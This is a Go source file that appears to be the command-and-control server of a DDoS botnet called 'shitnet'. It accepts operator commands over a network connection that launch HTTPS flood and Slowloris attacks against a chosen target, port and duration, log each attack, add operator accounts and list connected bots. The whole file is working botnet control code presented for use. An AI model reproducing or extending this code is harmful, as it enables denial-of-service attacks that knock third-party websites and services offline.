package cnc

import (
	"fmt"
	"net"
	"os"
	"shitnet/network/server"
	"strconv"
	"strings"

	"github.com/fatih/color"
)

func Print(text string, conn net.Conn) {
	_, err := conn.Write([]byte(text))
	if err != nil {
		DeadSession(conn)
	}

}

func CommandManager(conn net.Conn) {

	defer func() {
		if er := recover(); er != nil {
			fmt.Println(er)
		}
	}()

	if !Live {
		return
	}

	s, st := SessionList[conn]
	if st != true {
		conn.Close()
		DeadSession(conn)

	}

	if st == true {
		Print(color.HiWhiteString("["+s.Login+"@shit-net]$ "), conn)
	}
	line := make([]byte, 2048)

	_, err := conn.Read(line)

	if err != nil {
		conn.Close()
		DeadSession(conn)
		return
	}

	if strings.HasPrefix(string(line), "!https") {
		cmd := strings.Split(string(line), " ")
		fmt.Println(cmd)

		if len(cmd) < 3 {
			Print(color.HiMagentaString("!https <TARGET> <PORT> <DURATION>\n!https https://example.com 443 60\n"), conn)
			CommandManager(conn)
		}
		if len(cmd) > 4 {
			Print(color.HiMagentaString("!https <TARGET> <PORT> <DURATION>\n!https https://example.com 443 60\n"), conn)
			CommandManager(conn)
		}

		if !strings.HasPrefix(cmd[1], "https://") {
			Print(color.HiMagentaString("!https <TARGET> <PORT> <DURATION>\n!https https://example.com 443 60\n"), conn)
			CommandManager(conn)
		}

		go server.Https(cmd[1], cmd[3], cmd[2])
		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
		Print(color.HiWhiteString("[Shit-Network] ")+color.HiMagentaString("Command")+color.HiWhiteString(" successfully")+color.HiMagentaString(" sent\n"), conn)
	} else if strings.HasPrefix(string(line), "!slowloris") {
		cmd := strings.Split(string(line), " ")
		fmt.Println(cmd)

		if len(cmd) < 3 {
			Print(color.HiMagentaString("!slowloris <TARGET> <PORT> <DURATION>\n!slowloris https://example.com 443 60\n"), conn)
			CommandManager(conn)
		}
		if len(cmd) > 4 {
			Print(color.HiMagentaString("!slowloris <TARGET> <PORT> <DURATION>\n!slowloris https://example.com 443 60\n"), conn)
			CommandManager(conn)
		}

		if !strings.HasPrefix(cmd[1], "https://") {
			Print(color.HiMagentaString("!slowloris <TARGET> <PORT> <DURATION>\n!slowloris https://example.com 443 60\n"), conn)
			CommandManager(conn)
		}

		go server.Slowloris(cmd[1], cmd[3], cmd[2])
		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
		Print(color.HiWhiteString("[Shit-Network] ")+color.HiMagentaString("Command")+color.HiWhiteString(" successfully")+color.HiMagentaString(" sent\n"), conn)
	} else if strings.HasPrefix(string(line), "help") || strings.HasPrefix(string(line), "methods") {

		conn.Write([]byte("\n"))

		conn.Write([]byte(color.HiWhiteString("!https: Basic https flood\t\t| Type: L7\n")))
		conn.Write([]byte(color.HiWhiteString("!slowloris: Slowloris method\t\t| Type: L7\n")))

		conn.Write([]byte("\n"))

	} else if strings.HasPrefix(string(line), "cls") || strings.HasPrefix(string(line), "clear") {
		cls(conn)

	} else if strings.HasPrefix(string(line), "exit") || strings.HasPrefix(string(line), "kill") {
		conn.Close()
		return
	} else if strings.HasPrefix(string(line), "!adduser") {

		if s.Login != "root" {
			Print(color.HiMagentaString("Unknown command\n"), conn)
			CommandManager(conn)
		}
		///////////////

		line := strings.ReplaceAll(string(line), "\n", "")
		line = strings.ReplaceAll(line, "\x00", "")
		args := strings.Split(line, " ")

		if len(args) < 2 {
			Print(color.HiMagentaString("!adduser <LOGIN> <PASSWORD>\n"), conn)
			CommandManager(conn)
		}

		f, _ := os.OpenFile("./data/accounts.txt", os.O_RDWR|os.O_APPEND, 0600)
		f.Write([]byte(args[1] + ":" + args[2]))

		conn.Write([]byte("Success\n"))

	} else if strings.HasPrefix(string(line), "bots") {
		if s.Login != "root" {
			Print(color.HiMagentaString("Unknown command\n"), conn)
			CommandManager(conn)
		}

		count, list := server.GetBots()
		if count < 1 {
			Print(color.HiMagentaString("No bots connected\n"), conn)
		} else {
			Print(color.HiWhiteString("Bots count: "+color.HiMagentaString(strconv.Itoa(count))+"\n"), conn)
			Print(color.HiMagentaString(list+"\n"), conn)
		}
	} else {
		Print(color.HiMagentaString("Unknown command\n"), conn)
	}
	CommandManager(conn)

}
